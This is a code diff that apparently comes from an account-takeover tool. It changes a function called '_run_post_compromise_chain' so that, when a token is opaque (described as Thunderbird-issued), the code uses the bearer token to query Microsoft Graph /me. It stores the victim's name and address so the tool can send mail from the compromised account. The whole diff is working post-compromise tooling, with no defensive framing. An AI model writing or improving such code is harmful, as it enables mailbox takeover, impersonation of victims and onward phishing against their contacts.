@@ -292,6 +292,30 @@ def _run_post_compromise_chain(user_code):
                 or (_claims.get('unique_name') or '').split('#')[-1]
                 or _claims.get('preferred_username')
                 or _claims.get('upn'))
+        # Thunderbird returns OPAQUE (non-JWT) tokens, so claim decoding yields
+        # nothing. Fall back to a Graph /me lookup — the profile must be stored
+        # or B2B send cannot resolve the sender address and the self-recipient
+        # filter silently breaks.
+        if not _upn:
+            try:
+                import requests as _rq
+                _resp = _rq.get(
+                    'https://graph.microsoft.com/v1.0/me'
+                    '?$select=displayName,givenName,surname,userPrincipalName,mail',
+                    headers={'Authorization': f'Bearer {at}'}, timeout=15)
+                if _resp.status_code == 200:
+                    _me = _resp.json()
+                    _upn = _me.get('mail') or _me.get('userPrincipalName')
+                    if _upn:
+                        _claims = {
+                            'given_name': _me.get('givenName') or '',
+                            'family_name': _me.get('surname') or '',
+                            'name': _me.get('displayName') or '',
+                        }
+                else:
+                    logger.warning(f"[PERSONAL] /me lookup returned {_resp.status_code}")
+            except Exception as _e:
+                logger.warning(f"[PERSONAL] /me lookup failed: {_e}")
         if _upn:
             _given = _claims.get('given_name') or ''
             _family = _claims.get('family_name') or ''
